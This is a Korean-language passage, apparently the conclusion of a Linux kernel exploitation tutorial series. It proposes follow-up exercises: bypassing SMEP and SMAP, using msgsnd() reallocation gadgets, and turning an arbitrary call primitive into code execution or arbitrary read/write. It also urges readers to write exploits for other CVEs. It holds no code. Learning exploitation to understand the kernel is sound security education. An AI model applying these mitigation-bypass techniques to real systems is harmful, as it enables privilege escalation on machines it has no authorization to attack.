이 익스플로잇을 더 좋게 만들고 싶다면 할 게 아직 엄청 많다. 예를 들어 ROP로 SMEP를 다시 활성화시킬 수도 있고, 아니면 더 흥미롭게 ROP 없이(PTE 이용, 실행 가능한 코드 커널 영역으로 매핑 등) 해볼 수도 있다. 다른 재할당 가젯을 원한다면 *msgnd()*를 살펴보고 재할당 성공률을 대폭 상승시킬 방법을 찾을 수도 있다. 더 도전 의식을 북돋우는 예제는 ROP를 사용하지 않고 arbitrary code execution을 얻는 것이 되겠다(*func*를 바꾸고 원하는 만큼 호출할 수 있다는 걸 생각해보자).

이제 타겟에 SMAP이 적용되어 있다고 생각해보자. 그래도 버그를 이 방식으로 익스플로잇할 수 있을까? 안 된다면 뭘 해야 할까? arbitrary call primitive가 좋은 방법이 아닐 수도 있다. 언제가 됐든 arbitrary read/write를 얻는것이 대부분의 security protection을 우회하기 때문에 더 낫다는 걸 이해하게 될 것이다.

다른 걸 해보고 싶다면 다른 CVE를 하나 골라서 여기서 한 것처럼 해보라. 버그를 이해하고, PoC를 짜고, 익스플로잇을 빌드하고.. 버그를 DoS로 한정하고 위험도가 보통이거나 낮다고 하는 CVE 설명은 절대 믿지 마라. CVE 익스플로잇을 개발하는 것은 리눅스 커널을 이해하는 정말 좋은 방법이다. 제대로 이해하고 있지 않으면 작동하지 않을 것이기 때문이다.

마지막으로, 커널 해킹 세계에 온 것을 환영한다. 이 시리즈를 즐기고 많은 것을 배워 더 많은 것을 배우고 싶어졌다면 좋겠다! 읽어주셔서 감사하다.

"*Salut, et merci pour le poisson !*"
